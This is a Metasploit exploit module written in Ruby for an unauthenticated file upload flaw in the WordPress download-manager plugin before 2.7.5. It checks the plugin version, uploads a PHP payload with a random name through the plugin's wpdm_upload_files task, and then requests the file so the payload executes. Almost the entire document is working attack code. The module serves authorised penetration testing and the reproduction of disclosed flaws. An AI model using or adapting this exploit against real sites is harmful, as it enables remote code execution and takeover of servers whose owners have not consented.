##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::HTTP::Wordpress
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(
    info,
    'Name'           => 'Wordpress Download Manager (download-manager) 
Unauthenticated File Upload',
    'Description'    => %q{
      The WordPress download-manager plugin contains multiple 
unauthenticated file upload
      vulnerabilities which were fixed in version 2.7.5.
    },
    'Author'         =>
    [
      'Mickael Nadeau',     # initial discovery
      'Christian Mehlmauer' # metasploit module
    ],
    'License'        => MSF_LICENSE,
    'References'     =>
    [
      # The module exploits another vuln not mentioned in this post, but 
was also fixed
      ['URL', 
'http://blog.sucuri.net/2014/12/security-advisory-high-severity-wordpress-download-manager.html'],
      ['WPVDB', '7706']
    ],
    'Privileged'     => false,
    'Platform'       => ['php'],
    'Arch'           => ARCH_PHP,
    'Targets'        => [['download-manager < 2.7.5', {}]],
    'DefaultTarget'  => 0,
    'DisclosureDate' => 'Dec 3 2014'))
    end

    def check
      check_plugin_version_from_readme('download-manager', '2.7.5')
    end

    def exploit
      filename = "#{rand_text_alpha(10)}.php"

      data = Rex::MIME::Message.new
      data.add_part(payload.encoded, 'application/x-php', nil, 
"form-data; name=\"Filedata\"; filename=\"#{filename}\"")

      print_status("#{peer} - Uploading payload")
      res = send_request_cgi(
        'method'   => 'POST',
        'uri'      => normalize_uri(wordpress_url_backend, 'post.php'),
        'ctype'    => "multipart/form-data; boundary=#{data.bound}",
        'data'     => data.to_s,
        'vars_get' => { 'task' => 'wpdm_upload_files' }
      )

      if res && res.code == 200 && res.body && res.body.length > 0 && 
res.body =~ /#{Regexp.escape(filename)}$/
        uploaded_filename = res.body
        register_files_for_cleanup(uploaded_filename)
        print_status("#{peer} - File #{uploaded_filename} successfully 
uploaded")
      else
        fail_with(Failure::Unknown, "#{peer} - Error on uploading file")
      end

      file_path = normalize_uri(target_uri, 'wp-content', 'uploads', 
'download-manager-files', uploaded_filename)

      print_status("#{peer} - Calling uploaded file #{file_path}")
      send_request_cgi(
        {
          'uri'    => file_path,
          'method' => 'GET'
        }, 5)
    end
  end
